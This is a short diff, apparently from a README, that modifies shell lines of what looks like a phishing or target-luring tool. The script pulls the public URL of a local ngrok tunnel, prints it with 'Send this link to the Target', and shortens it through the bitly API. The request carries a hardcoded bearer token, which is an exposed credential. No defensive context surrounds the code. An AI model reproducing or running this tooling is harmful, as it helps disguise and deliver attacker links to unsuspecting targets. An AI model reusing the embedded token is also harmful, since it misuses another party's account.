@@ -28,8 +28,9 @@ Support the authors:
 
 ### Modified
 ```
-link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | ./jq -r '.tunnels[0].public_url' > link.txt)
-send_link=$(cat link.txt)
+link=$(curl -s -N http://localhost:4040/api/tunnels > link.txt)
+
+send_link=$(cat link.txt | cut -d',' -f3 | cut -d '"' -f4)
 printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Target:\e[0m\e[1;77m %s\e[0m\n" $send_link
 
 bitly=$(curl -s --location --request POST 'https://api-ssl.bitly.com/v4/shorten' --header 'Authorization: Bearer 4829231012ed0febfc5a1cb741df0f2e934abe40' --header 'Content-Type: application/json' --data-raw '{"long_url": "'$send_link'"}' | ./jq -r '.id')
